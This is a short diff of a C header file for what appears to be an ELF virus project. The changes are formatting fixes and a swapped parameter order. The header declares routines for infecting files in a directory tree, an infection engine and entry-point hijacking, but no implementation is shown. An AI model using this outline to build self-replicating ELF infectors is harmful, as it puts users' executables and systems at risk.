@@ -1,4 +1,3 @@
-
 #ifndef VIRUS_H
 # define VIRUS_H
 
@@ -24,7 +23,7 @@
 ** entry point related informations
 */
 
-struct				entry
+struct entry
 {
 	struct elf64_phdr	*safe_phdr;
 	struct elf64_shdr	*safe_shdr;
@@ -40,7 +39,7 @@ struct				entry
 void		virus(const struct virus_header *vhdr);
 void		infect_files_in(const struct virus_header *vhdr, const char *root_dir);
 bool		infect(const struct virus_header *vhdr, const char *file);
-bool		infection_engine(struct virus_header *vhdr, struct safe_ptr clone_ref, struct safe_ptr file_ref, size_t *shift_amount);
+bool		infection_engine(struct virus_header *vhdr, struct safe_ptr file_ref, struct safe_ptr clone_ref, size_t *shift_amount);
 
 /*
 ** infection engine routines
@@ -59,7 +58,7 @@ bool		change_entry(struct safe_ptr clone_ref, const struct entry *file_entry, si
 ** elf iterators
 */
 
-typedef	bool	(*f_iter_callback)(struct safe_ptr ref, size_t offset, void *data);
+typedef bool	(*f_iter_callback)(struct safe_ptr ref, size_t offset, void *data);
 
 bool		foreach_phdr(struct safe_ptr ref, f_iter_callback callback, void *data);
 bool		foreach_shdr(struct safe_ptr ref, f_iter_callback callback, void *data);
